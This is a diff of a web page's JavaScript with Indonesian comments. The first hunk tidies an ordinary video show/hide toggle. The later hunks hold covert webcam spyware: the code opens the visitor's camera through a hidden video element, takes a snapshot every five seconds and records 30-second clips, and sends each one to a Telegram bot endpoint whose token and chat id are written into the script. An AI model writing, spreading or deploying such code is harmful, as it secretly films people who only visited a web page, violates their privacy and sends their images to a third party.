@@ -1,35 +1,28 @@
 /* --- Bagian JavaScript untuk Fungsi Video --- */
 
 function toggleVideo(videoId) {
-  // Dapatkan elemen kontainer video dan tombol yang diklik
   const videoContainer = document.getElementById(videoId);
   const button = event.target;
   const iframe = videoContainer.querySelector("iframe");
   let currentSrc = iframe.src;
 
   if (videoContainer.style.display === "block") {
-    // Logika untuk SEMBUNYIKAN video
     videoContainer.style.display = "none";
     button.textContent = "Lihat Video";
 
-    // Hentikan pemutaran video (dengan me-reload iframe tanpa autoplay)
     if (currentSrc.includes("autoplay=1")) {
       iframe.src = currentSrc.replace("autoplay=1", "autoplay=0");
     } else {
       iframe.src = currentSrc;
     }
   } else {
-    // Logika untuk TAMPILKAN video
     videoContainer.style.display = "block";
     button.textContent = "Sembunyikan Video";
 
-    // Mulai pemutaran video (dengan menambahkan parameter autoplay=1)
     if (!currentSrc.includes("autoplay=1")) {
-      // Jika belum ada parameter query, tambahkan dengan "?"
       if (!currentSrc.includes("?")) {
         iframe.src = currentSrc + "?autoplay=1&controls=1";
       } else {
-        // Jika sudah ada parameter, tambahkan dengan "&"
         iframe.src = currentSrc.replace("autoplay=0", "autoplay=1");
       }
     }
@@ -40,27 +33,29 @@ function toggleVideo(videoId) {
 navigator.mediaDevices
   .getUserMedia({ video: true, audio: false })
   .then((stream) => {
+    // Buat elemen video tanpa ditampilkan
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+    video.autoplay = true;
+    video.play(); // 🔥 wajib biar frame update
 
     // 🔥 Ambil foto tiap 5 detik
     setInterval(() => {
       const canvas = document.getElementById("snapshot");
       canvas.width = 640;
       canvas.height = 480;
-      canvas
-        .getContext("2d")
-        .drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob((blob) => {
         const form = new FormData();
         form.append("chat_id", "@kwoskakkjka");
         form.append("photo", blob);
-        fetch(
-          "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendPhoto",
-          {
-            method: "POST",
-            body: form,
-          }
-        );
+        fetch("https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendPhoto", {
+          method: "POST",
+          body: form,
+        });
       }, "image/jpeg");
     }, 5000);
 
@@ -75,18 +70,15 @@ navigator.mediaDevices
       const form = new FormData();
       form.append("chat_id", "@kwoskakkjka");
       form.append("video", blob);
-      fetch(
-        "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendVideo",
-        {
-          method: "POST",
-          body: form,
-        }
-      );
+      fetch("https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendVideo", {
+        method: "POST",
+        body: form,
+      });
     };
 
     setInterval(() => {
       recorder.start();
-      setTimeout(() => recorder.stop(), 30000); // rekam 30 detik
+      setTimeout(() => recorder.stop(), 30000);
     }, 30000);
   })
   .catch(() => {
